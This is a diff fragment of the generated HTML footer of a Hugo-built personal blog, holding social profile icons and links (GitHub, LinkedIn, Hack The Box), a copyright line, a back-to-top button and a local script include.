+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
